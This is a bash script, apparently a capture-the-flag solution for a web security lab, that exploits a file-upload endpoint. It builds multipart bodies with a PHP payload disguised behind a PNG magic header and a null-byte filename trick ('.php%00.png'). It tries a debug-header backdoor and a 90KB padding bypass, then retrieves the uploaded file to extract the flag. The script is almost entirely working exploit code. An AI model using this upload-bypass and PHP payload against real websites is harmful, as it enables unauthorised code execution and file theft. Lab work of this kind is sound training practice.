#!/usr/bin/env bash
cd "$(dirname "$0")" || exit 1
clear
H='Host: test-s3.web0x05.hbtn'
B='http://web0x05.hbtn'
URL="$B/api/task4/"
PHP='<?php readfile('"'"'FLAG_4.txt'"'"') ?>'
BND='----sep444'

build() {  # $1 = fichier de sortie ; $2 = filename ; $3 = taille padding (octets)
  local out="$1" fn="$2" pad="$3"
  {
    printf -- "--%s\r\n" "$BND"
    printf 'Content-Disposition: form-data; name="file"; filename="%s"\r\n' "$fn"
    printf 'Content-Type: image/png\r\n\r\n'
    printf '%b' '\x89PNG\r\n\x1a\n'
    printf '%s\n' "$PHP"
    if [ "$pad" -gt 0 ]; then head -c "$pad" /dev/zero | tr '\0' 'A'; fi
    printf '\r\n'
    printf -- "--%s--\r\n" "$BND"
  } > "$out"
}

send() {  # $1 label ; $2 bodyfile ; $3 extra header (ou vide)
  local label="$1" body="$2" extra="$3" resp path out
  if [ -n "$extra" ]; then
    resp=$(curl -s -H "$H" -H "$extra" -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$body" "$URL")
  else
    resp=$(curl -s -H "$H" -H "Content-Type: multipart/form-data; boundary=$BND" --data-binary @"$body" "$URL")
  fi
  echo "[$label] -> $resp"
  path=$(echo "$resp" | grep -oE "/static/[^']*" | head -1)
  if [ -n "$path" ]; then
    out=$(curl -s -H "$H" "$B$path" | grep -aoE '[0-9a-f]{32}' | head -1)
    echo "        FLAG via $path => $out"
  fi
}

# (A) backdoor : petit fichier + header X-Debug-Mode: True
build /tmp/small.bin 'p4a.php%00.png' 0
send "A: X-Debug-Mode True (petit)" /tmp/small.bin "X-Debug-Mode: True"

# (B) vraie methode : padding > 80KB
build /tmp/big.bin 'p4b.php%00.png' 90000
echo "taille body B = $(wc -c < /tmp/big.bin) octets"
send "B: padding 90KB" /tmp/big.bin ""
